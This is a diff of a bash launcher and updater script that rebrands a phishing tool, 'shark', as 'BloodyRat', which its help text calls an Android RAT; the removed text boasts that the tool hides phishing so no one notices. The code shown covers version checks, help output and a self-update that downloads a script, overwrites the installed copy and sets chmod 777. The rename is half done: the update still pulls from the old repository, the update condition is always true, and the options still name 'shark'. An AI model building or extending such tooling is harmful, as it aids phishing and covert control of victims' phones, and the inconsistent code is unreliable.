@@ -1,10 +1,12 @@
 #! /bin/bash
 
+VERSION="1.0.1"
+
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/BloodyRat/main/BloodyRat | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/BloodyRat/main/files/BloodyRat | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
-		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
+		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run BloodyRat -u , BloodyRat --update" && echo && exit 1;	       
         fi
 }
 
@@ -24,20 +26,20 @@ function internet() {
 }
 
 function main_update() {
-	launch="updating shark"
-	splashdown="updated shark";echo
+	launch="updating BloodyRat"
+	splashdown="updated BloodyRat";echo
 	os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 }
 
 function check_update() {	
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/BloodyRat/main/files/BloodyRat | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
                 echo -e "\tReading \tpackage \tlists... \tDone
                          \tBuilding \tdependency \ttree       
                          \tReading \tstate \tinformation... \tDone
-                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
+                         \tBloodyRat \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
 	        exit 1
 	else
 		main_update
@@ -48,18 +50,14 @@ function check_update() {
 usage() {
         cat <<EOF
 Usage: $(basename $0) [OPTIONS] available
-shark - future of phishing is here,
-A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
+BloodyRat - future of phishing is here,
+A BloodyRat is a android Rat.
 Copyright 2020 <ashishsingh103020@gmail.com>
 Options:
   -u, --update      Update shark
   -v, --version     Display the current shark version installed on your device
   -h, --help        Print this help message
-  -a, --assist      List detail discription of shark
-  -p, --purge       Uninstall shark
-  --fix-ngrok       Fix port forwarding issue 
-  --fix-patches     Check missing packages & fix patches
-  --fix-cloudshell  Restart Vm and cloudshell & fix patches
+  --fix-apkbuilder  Fix aapt2 path to build apk
 For additional info, see: https://github.com/Bhaviktutorials/shark
 EOF
 }
@@ -111,7 +109,7 @@ function os() {
 		main="/home/${user_name}/.BloodyRat/server"			
 	else   	        
 		OS=TERMUX		
-		main="/usr/share/BloodyRat/server"
+		#main="/usr/share/BloodyRat/server"
 fi
 }
 os
